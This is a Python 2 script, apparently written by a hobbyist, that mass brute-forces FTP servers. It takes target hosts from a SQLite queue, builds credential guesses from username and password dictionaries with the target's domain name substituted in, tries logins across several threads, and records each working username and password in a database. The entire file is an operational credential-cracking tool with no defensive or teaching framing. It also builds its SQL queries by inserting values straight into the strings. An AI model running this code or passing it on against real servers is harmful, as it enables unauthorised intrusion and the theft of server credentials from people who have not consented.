#!/usr/local/bin/python
##################################################
#qq:29295842
#BLOG:http://hi.baidu.com/alalmn


from ftplib import FTP
import urllib2, time
import Csqlite3
import socket
import threading
socket.setdefaulttimeout(10)
import thread
from threading import Thread
from collections import defaultdict, deque


class CS_linkftp(threading.Thread):
    def __init__(self,htint):
        threading.Thread.__init__(self)
        self.Internet=10
        self.Ht=htint
        self.Chost=""
        self.sql3=Csqlite3.C_sqlite3()
        self.sql3.mysqlite3_open()

    def run(self):
        try:
            print "<<<FTP CS_linkftp%d run"%(self.Ht)
            self.open_mysql()
            #self.Chost="127.0.0.1"
            #self.ftp_login(self.Chost)
        except:
            print "<<<%d--CS_linkftp---run --try: except:"%(self.Ht)
            time.sleep(60)
            self.run()

    def open_mysql(self):
        try:
            self.Asql="select * from openftp where linkftp is NULL limit 1"
            self.data = self.sql3.mysqlite3_select(self.Asql)
            if ~self.data.find("null123456"):
                print "<<<%d--CS_linkftp--openftp"%(self.Ht)
                time.sleep(300)
                self.open_mysql()

            if self.data == '':
                time.sleep(60)
                self.open_mysql()
            self.update = "update openftp set linkftp='send' where url='%s'"%(self.data)
            self.sql3.mysqlite3_update(self.update)
            self.ftp_login(self.data)
        except:
            print "<<<%d--CS_linkftp--openftp URL  try: except:"%(self.Ht)
            time.sleep(60)
            self.open_mysql()

    WEAK_USERNAME = [p.replace('\n','') for p in open('username.dic').readlines()]
    WEAK_PASSWORD = [p.replace('\n','') for p in open('password.dic').readlines()]

    def get_sdomain(self,domain):
        suffixes = 'ac', 'ad', 'ae', 'aero', 'af', 'ag', 'ai', 'al', 'am', 'an', 'ao', 'aq', 'ar', 'arpa', 'as', 'asia', 'at', 'au', 'aw', 'ax', 'az', 'ba', 'bb', 'bd', 'be', 'bf', 'bg', 'bh', 'bi', 'biz', 'bj', 'bm', 'bn', 'bo', 'br', 'bs', 'bt', 'bv', 'bw', 'by', 'bz', 'ca', 'cat', 'cc', 'cd', 'cf', 'cg', 'ch', 'ci', 'ck', 'cl', 'cm', 'cn', 'co', 'com', 'coop', 'cr', 'cu', 'cv', 'cx', 'cy', 'cz', 'de', 'dj', 'dk', 'dm', 'do', 'dz', 'ec', 'edu', 'ee', 'eg', 'er', 'es', 'et', 'eu', 'fi', 'fj', 'fk', 'fm', 'fo', 'fr', 'ga', 'gb', 'gd', 'ge', 'gf', 'gg', 'gh', 'gi', 'gl', 'gm', 'gn', 'gov', 'gp', 'gq', 'gr', 'gs', 'gt', 'gu', 'gw', 'gy', 'hk', 'hm', 'hn', 'hr', 'ht', 'hu', 'id', 'ie', 'il', 'im', 'in', 'info', 'int', 'io', 'iq', 'ir', 'is', 'it', 'je', 'jm', 'jo', 'jobs', 'jp', 'ke', 'kg', 'kh', 'ki', 'km', 'kn', 'kp', 'kr', 'kw', 'ky', 'kz', 'la', 'lb', 'lc', 'li', 'lk', 'lr', 'ls', 'lt', 'lu', 'lv', 'ly', 'ma', 'mc', 'md', 'me', 'mg', 'mh', 'mil', 'mk', 'ml', 'mm', 'mn', 'mo', 'mobi', 'mp', 'mq', 'mr', 'ms', 'mt', 'mu', 'mv', 'mw', 'mx', 'my', 'mz', 'na', 'name', 'nc', 'ne', 'net', 'nf', 'ng', 'ni', 'nl', 'no', 'np', 'nr', 'nu', 'nz', 'om', 'org', 'pa', 'pe', 'pf', 'pg', 'ph', 'pk', 'pl', 'pm', 'pn', 'pr', 'pro', 'ps', 'pt', 'pw', 'py', 'qa', 're', 'ro', 'rs', 'ru', 'rw', 'sa', 'sb', 'sc', 'sd', 'se', 'sg', 'sh', 'si', 'sj', 'sk', 'sl', 'sm', 'sn', 'so', 'sr', 'st', 'su', 'sv', 'sy', 'sz', 'tc', 'td', 'tel', 'tf', 'tg', 'th', 'tj', 'tk', 'tl', 'tm', 'tn', 'to', 'tp', 'tr', 'tt', 'tv', 'tw', 'tz', 'ua', 'ug', 'uk', 'us', 'uy', 'uz', 'va', 'vc', 've', 'vg', 'vi', 'vn', 'vu', 'wf', 'ws', 'xn', 'ye', 'yt', 'za', 'zm', 'zw'
        sdomain = []
        bdomain = False
        for section in domain.split('.'):
            if section in suffixes:
                sdomain.append(section)
                bdomain = True
            else:
                sdomain = [section]
        return '.'.join(sdomain) if bdomain  else ''

    def get_ssdomain(self,domain):
        sdomain = self.get_sdomain(domain)
        ssdomian = sdomain.partition('.')[0] if sdomain else ''
        return ssdomian

    def ftp_login(self,host,nthreads=5,port=21):
        self.t=time.time()
        try:
            ftpA = FTP()
            ftpA.connect(host,port)
        except Exception, e:
            print "<<<%d--%s NOFTP21"%(self.Ht,host)
            self.upf2 = "update  openftp set  linkftp='no21' where url='%s'"%(host)
            self.sql3.mysqlite3_update(self.upf2)
            time.sleep(10)
            self.open_mysql()
            return

        ###################################
        Adomain = host     #www.baidu.com
        Bdomain = self.get_sdomain(Adomain)  #www.baidu.com->baidu.com
        Cdomain = self.get_ssdomain(Adomain)  #www.baidu.com->baidu
        Ddomain = "" #www.baidu.com->wwwbaiducom
        for i, j in {'.':''}.iteritems():#.
            Ddomain = Adomain.replace(i,j)
        #print Ddomain
        ###################################
        accounts = deque()

        for username in CS_linkftp.WEAK_USERNAME:   #WEAK_USERNAME=username.dic
            if  '%Adomain%' in username or '%Bdomain%' in username or '%Cdomain%' in username or '%Ddomain%' in username:
                if Adomain=='':
                    continue
                else:
                    username = username.replace('%Adomain%',Adomain)
                    username = username.replace('%Bdomain%',Bdomain)
                    username = username.replace('%Cdomain%',Cdomain)
                    username = username.replace('%Ddomain%',Ddomain)

            for password in CS_linkftp.WEAK_PASSWORD:   #WEAK_PASSWORD=password.dic
                if '%Adomain%' in password or '%Bdomain%' in password or '%Cdomain%' in password or '%Ddomain%' in password:
                    if Adomain=='':
                        continue
                    else:
                        password = password.replace('%Adomain%',Adomain)
                        password = password.replace('%Bdomain%',Bdomain)
                        password = password.replace('%Cdomain%',Cdomain)
                        password = password.replace('%Ddomain%',Ddomain)

                password = password.replace('%null%','')
                password = password.replace('%username%',username)

                if (username,password) not in accounts:
                    accounts.append((username,password))
                    ##################################################################

        if not accounts:
            time.sleep(60)
            self.open_mysql()
            return 0
        class crackThread(Thread):
            def __init__(self,Ht):
                Thread.__init__(self)
                self.AHt=Ht
                self.running = True
                self.ftp = FTP()

            def run(self):
                MAX_RETRIES = 5
                retry = 0
                account = None
                while self.running and accounts:

                    try:
                        self.ftp.connect(Adomain,port)
                    except Exception, e:
                        if retry <= MAX_RETRIES:
                            retry = retry +1
                            continue
                        else:
                            self.running = False
                            break

                    loop_num = 0
                    while loop_num<3:
                        loop_num = loop_num + 1

                        if not account and accounts:
                            account = accounts.pop()

                        if not account:
                            break

                        try:
                            self.ftp.login(account[0],account[1])
                            self.Asql3=Csqlite3.C_sqlite3()
                            self.Asql3.mysqlite3_open()
                            print "<<<",self.AHt,'--FTP OK IP:',host,"user:",account[0],"pass:",account[1]
                            ABCsql = "insert into ftppassword0(IP,user,password,time) values('%s','%s','%s','%s')"%(host,account[0],account[1],time.strftime('%Y.%m.%d-%H.%M.%S'))
                            self.Asql3.mysqlite3_insert(ABCsql)
                            time.sleep(3)
                            #os.system('python adminFTP.py %s %s %s'%(host,account[0],account[1]))
                            account = None  #None=NULL   self.sql.
                        except Exception, e:
                            emsg = str(e)
                            if 'connection' in emsg.lower() or 'tries' in emsg.lower():
                                retry = retry +1
                                break
                            else:
                                #reset retry
                                account = None  #None=NULL
                                retry = 0

        threads = []
        for i in range(nthreads):
            threads.append(crackThread(self.Ht))

        for thread in threads:
            thread.start()

        for thread in threads:
            thread.join()
        print "<<<%d--==%s   %s=====time%s<<<"%(self.Ht,host,time.strftime('%Y.%m.%d-%H.%M.%S'),time.time()-self.t)
        self.open_mysql()

################################################
if __name__=='__main__':
    threads = []
    nthreads=1
    for i in range(nthreads):
        threads.append(CS_linkftp(i))

    for thread in threads:
        thread.start()












